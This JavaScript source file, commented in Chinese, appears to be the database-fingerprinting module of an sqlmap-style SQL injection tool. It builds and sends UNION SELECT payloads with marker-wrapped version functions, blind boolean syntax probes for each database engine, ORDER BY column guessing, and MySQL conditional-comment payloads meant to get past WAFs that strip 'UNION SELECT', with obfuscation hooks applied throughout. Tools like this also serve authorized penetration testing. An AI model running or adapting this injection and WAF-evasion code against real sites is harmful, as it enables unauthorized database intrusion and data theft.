import { FINGERPRINT, DB_VERSION, nullSequence } from './payloads.js';
import {
  buildInjectionRequest,
  sendInjection,
  obfuscateIfNeeded,
  discoverEchoColumns,
  guessColumnsBinary,
  resolveUnionColumns,
} from './injection.js';

// 不同库对标记包裹的方式（UNION 提取版本时定位回显列）
const WRAP = {
  MySQL: (s) => `CONCAT('__S__',CAST((${s}) AS CHAR),'__E__')`,
  PostgreSQL: (s) => `('__S__' || CAST((${s}) AS TEXT) || '__E__')`,
  SQLite: (s) => `('__S__' || (${s}) || '__E__')`,
  'SQL Server': (s) => `('__S__'+CAST((${s}) AS VARCHAR(MAX))+'__E__')`,
  Oracle: (s) => `('__S__' || TO_CHAR((${s})) || '__E__')`,
};

// 数据库指纹识别器：按响应头特征 + UNION 版本回显 + 主动语法探针判定 dbms
export class DBFingerprinter {
  // 各库专属函数 TRUE 探针（对标 sqlmap 主动语法指纹）：仅目标库能解析该语法，
  // 命中→TRUE 条件成立→响应≈基线；非目标库→语法错误→响应偏离基线→排除。
  // 无需 UNION 回显列，用于"盲注型/不回显页面"目标的 DBMS 识别兜底。
  static SYNTAX_PROBE = {
    SQLite: (orig) => `${orig} AND sqlite_version() IS NOT NULL`,
    MySQL: (orig) => `${orig} AND CONNECTION_ID() IS NOT NULL`,
    MariaDB: (orig) => `${orig} AND CONNECTION_ID() IS NOT NULL`,
    PostgreSQL: (orig) => `${orig} AND current_database() IS NOT NULL`,
    // SQL Server 探针刻意避开 @@version（MySQL/MariaDB 也支持 → 歧义误判），
    // 改用 ISNULL(1,1)=1：SQL Server 的 ISNULL 为双参函数返回前者；MySQL 的 ISNULL 仅单参
    // → 参数计数错误被排除；PostgreSQL/SQLite/Oracle 均无双参 ISNULL → 排除。
    'SQL Server': (orig) => `${orig} AND ISNULL(1,1)=1`,
    Oracle: (orig) => `${orig} AND (SELECT 1 FROM all_tables WHERE ROWNUM=1)=1`,
  };
  /**
   * @param {object} ctx { httpClient, target, point, config }
   * @returns {Promise<{dbms: string|null, baseline: {status:number, headers:object, body:string}}>}
   *   dbms: 命中的数据库类型；baseline: 指纹阶段已抓取的良性基线响应（供 WAF 识别复用，零额外发包）
   */
  async fingerprint(ctx) {
    const { httpClient, target, point, config } = ctx;
    const maxCols = config?.maxColumnsGuess ?? 50;
    const obf = (s) => obfuscateIfNeeded(ctx, s);

    const baseReq = buildInjectionRequest(target, point, obf(point.originalValue || '1'), ctx);
    const baseline = await sendInjection(httpClient, ctx, baseReq);
    // 归一化基线响应（status/headers/body），供 WAF 指纹识别复用，不发起任何新请求
    const baselineResp = {
      status: baseline?.status ?? 0,
      headers: baseline?.headers ?? {},
      body: String(baseline?.data ?? ''),
    };
    const baseLen = baselineResp.body.length;

    // 1) 猜列数（ORDER BY 二分枚举，O(log n) 替代线性 O(n)，对齐 sqlmap）
    //    --union-cols 支持精确值（跳过枚举直接定列数）或范围（约束枚举上下界）
    const colSpec = resolveUnionColumns(config, maxCols);
    const columns = colSpec && colSpec.exact != null
      ? colSpec.exact
      : await guessColumnsBinary(
          httpClient,
          ctx,
          baseLen,
          colSpec ? colSpec.max : maxCols,
          colSpec ? colSpec.min : 1
        );

    // 2) 响应头快速识别（命中即定库，无需 UNION）
    const headers = baseline?.headers || {};
    for (const [dbms, sigs] of Object.entries(FINGERPRINT)) {
      const hit = sigs.some((s) => {
        const hv = headers[s.header.toLowerCase()];
        return hv != null && s.match.test(hv);
      });
      if (hit) return { dbms, baseline: baselineResp };
    }

    // 3) 定位回显列（标记 UNION），无回显则无法走 UNION 指纹
    const echoCols = await discoverEchoColumns(httpClient, ctx, columns);
    if (!echoCols.length) {
      // 无 UNION 回显（盲注型/不回显页面目标）：主动语法探针兜底识别 DBMS
      const dbms = await this.probeSyntaxFingerprint(ctx, baselineResp);
      return { dbms, baseline: baselineResp };
    }

    // 4) 各库版本函数置于首个回显列，检测标记间版本特征
    // MariaDB 置于遍历首位（优先命中），且复用以 MySQL 的 WRAP（协议互通）
    let dbms = null;
    const order = ['MariaDB', ...Object.keys(DB_VERSION).filter((k) => k !== 'MariaDB')];
    for (const d of order) {
      const info = DB_VERSION[d];
      const wrapKey = d === 'MariaDB' ? 'MySQL' : d;
      const nulls = nullSequence(columns).split(',');
      const idx = echoCols[0];
      const cols = nulls
        .map((_, i) => (i === idx ? WRAP[wrapKey](info.func) : 'NULL'))
        .join(',');
      const fromDual = d === 'Oracle' ? ' FROM dual' : '';
      const payload = `${point.originalValue || '1'} UNION SELECT ${cols}${fromDual}-- -`;
      const res = await sendInjection(
        httpClient,
        ctx,
        buildInjectionRequest(target, point, obf(payload), ctx)
      );
      const body = String(res?.data ?? '');
      const m = body.match(/__S__(.*?)__E__/s);
      const ver = m ? m[1] : '';
      if (info.sig.test(ver)) {
        dbms = d;
        break;
      }
    }

    // 5) 明文 UNION 未命中 → 版本化条件注释兜底（sqlmap 风格 /*!50000 ... */）。
    // MySQL/MariaDB ≥5.0 才会执行条件注释内的语句；当 WAF 剥离明文 "UNION SELECT" 但放行
    // 条件注释时，可借此恢复 MySQL/MariaDB 识别（其余库把 /*! ... */ 当普通注释，UNION 被注释掉 → 不回显）。
    if (!dbms && echoCols.length) {
      const vc = await this.probeVersionComment(ctx, columns, echoCols);
      if (vc) dbms = vc;
    }

    return { dbms, baseline: baselineResp };
  }

  /**
   * 主动语法探针指纹（对标 sqlmap heuristic/syntax check）。
   *
   * 触发前提：UNION 无回显列（盲注型 / 不回显页面目标），无法走 UNION 版本回显那一套。
   * 机理：各库专属标量函数构造 TRUE 条件（SYNTAX_PROBE），逐库发送并与基线比对——
   *   · 命中库能解析该语法 → TRUE 条件成立 → 返回与基线相同的行 → 响应≈基线 → 判定命中
   *   · 非命中库语法错误 → 5xx / 错误页 → 响应偏离基线 → 排除
   * 与 UNION 指纹互补：UNION 指纹靠"回显列 + 版本函数"，本方法靠"语法能否解析"，无需页面回显。
   *
   * 判别准则（宽松但够用）：
   *   1) 状态码必须与基线一致（错误页通常 5xx 或 200 错误页 → 状态码/长度偏离被排除）
   *   2) 响应体长度与基线的比值落在 [0.6, 1.6] 容差带（容忍动态内容噪声，排除骤缩/骤胀的错误页）
   * 二者同时成立才视为命中，返回首个命中的 DBMS。
   *
   * 已知局限：
   *   · MySQL / MariaDB 共用 CONNECTION_ID() 探针，无法靠本方法区分二者，返回遍历首个命中者
   *     （二者协议互通，对注入利用影响极小；UNION 阶段才会进一步细化）
   *   · 若目标对所有查询（含语法错误）都返回同一固定页面，则无法区分，会乐观返回首个候选；
   *     这是"盲到连错误都看不到"目标的固有天花板，非本方法缺陷
   *
   * @param {object} ctx { httpClient, target, point, config }
   * @param {{status:number, headers:object, body:string}} baselineResp 指纹阶段已抓取的良性基线
   * @returns {Promise<string|null>} 命中的 dbms 或 null
   */
  async probeSyntaxFingerprint(ctx, baselineResp) {
    const { httpClient, target, point } = ctx;
    const obf = (s) => obfuscateIfNeeded(ctx, s);
    const orig = point.originalValue || '1';
    const baseLen = baselineResp.body.length;
    const baseStatus = baselineResp.status;

    for (const dbms of Object.keys(DBFingerprinter.SYNTAX_PROBE)) {
      const probe = DBFingerprinter.SYNTAX_PROBE[dbms](orig);
      const req = buildInjectionRequest(target, point, obf(probe), ctx);
      const res = await sendInjection(httpClient, ctx, req);
      if (!res) continue; // 网络/超时错误 → 跳过该库，不误判
      const status = res.status ?? 0;
      const body = String(res.data ?? '');
      const lenRatio = baseLen > 0 ? body.length / baseLen : (body.length > 0 ? Infinity : 1);
      const statusOk = status === baseStatus;
      // 基线为空时等价为"响应也必须为空"；否则长度落在 ±容差带内
      const lenOk = baseLen === 0 ? body.length === 0 : (lenRatio >= 0.6 && lenRatio <= 1.6);
      if (statusOk && lenOk) return dbms;
    }
    return null;
  }

  /**
   * 版本化条件注释探测（sqlmap 风格）。
   * 仅 MySQL/MariaDB 会执行 /*!50000 ... *\/ 内的语句；其余库将其视为普通注释，UNION 被注释掉，不会回显。
   * 用于：① 确认 MySQL 家族；② 明文 UNION 被 WAF 剥离时的兜底识别。
   * @param {object} ctx { httpClient, target, point, config }
   * @param {number} columns 已确定的列数
   * @param {number[]} echoCols 已定位的回显列（0-based）
   * @returns {Promise<string|null>} 命中返回 'MySQL' | 'MariaDB'，否则 null
   */
  async probeVersionComment(ctx, columns, echoCols) {
    const { httpClient, target, point } = ctx;
    const obf = (s) => obfuscateIfNeeded(ctx, s);
    if (!echoCols || !echoCols.length) return null;
    for (const dbms of ['MariaDB', 'MySQL']) {
      const nulls = nullSequence(columns).split(',');
      const idx = echoCols[0];
      const cols = nulls
        .map((_, i) => (i === idx ? WRAP.MySQL(DB_VERSION[dbms].func) : 'NULL'))
        .join(',');
      // 条件注释包裹 UNION SELECT：仅 MySQL/MariaDB ≥5.0 执行
      const payload = `${point.originalValue || '1'}/*!50000 UNION SELECT ${cols}*/`;
      const res = await sendInjection(
        httpClient,
        ctx,
        buildInjectionRequest(target, point, obf(payload), ctx)
      );
      const body = String(res?.data ?? '');
      const m = body.match(/__S__(.*?)__E__/s);
      const ver = m ? m[1] : '';
      if (DB_VERSION[dbms].sig.test(ver)) return dbms;
    }
    return null;
  }
}

export default DBFingerprinter;
